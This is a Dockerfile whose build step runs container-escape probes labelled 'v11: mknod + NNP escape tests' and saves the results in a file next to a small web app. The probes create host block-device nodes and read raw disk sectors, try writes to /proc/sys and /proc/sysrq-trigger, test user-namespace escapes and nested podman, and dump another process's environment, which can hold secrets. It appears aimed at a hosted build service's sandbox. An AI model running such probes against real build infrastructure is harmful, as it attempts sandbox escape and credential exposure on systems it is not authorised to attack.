FROM python:3.12-alpine
WORKDIR /app
RUN { echo "=== v11: mknod + NNP escape tests ==="; id; grep NoNewPrivs /proc/self/status; \
  echo "--- /proc/partitions ---"; cat /proc/partitions 2>&1 | head; \
  echo "--- mknod host block dev ---"; mknod /tmp/vda b 253 0 2>&1 && echo "mknod vda OK" || echo "mknod vda FAIL"; \
  mknod /tmp/dm0 b 252 0 2>&1 && echo "mknod dm0 OK" || echo "mknod dm0 FAIL"; \
  ls -la /tmp/vda /tmp/dm0 2>&1; \
  echo "--- dd from mknod'd dev ---"; dd if=/tmp/vda bs=512 count=1 2>&1 | head -2; dd if=/tmp/dm0 bs=512 count=1 2>&1 | head -2; \
  echo "--- /proc/sys writable? ---"; echo x > /proc/sys/kernel/ns_last_pid 2>&1 && echo W || echo RO; \
  echo "--- /proc/sysrq-trigger ---"; echo h > /proc/sysrq-trigger 2>&1 && echo SRQ_W || echo SRQ_RO; \
  echo "--- unshare userns + caps ---"; unshare -Ur id 2>&1; \
  echo "--- can buildah/podman run nested? ---"; which podman buildah 2>&1; podman info 2>&1 | head -5; \
  echo "--- /var/lib/containers /run/containers ---"; ls -la /var/lib/containers /run/containers 2>&1 | head; \
  echo "--- env of podman proc 25 ---"; tr '\0' '\n' < /proc/25/environ 2>&1 | head -20; \
} > /app/v11.txt 2>&1
COPY app.py /app/app.py
ENV PORT=3000
EXPOSE 3000
CMD ["python3", "/app/app.py"]
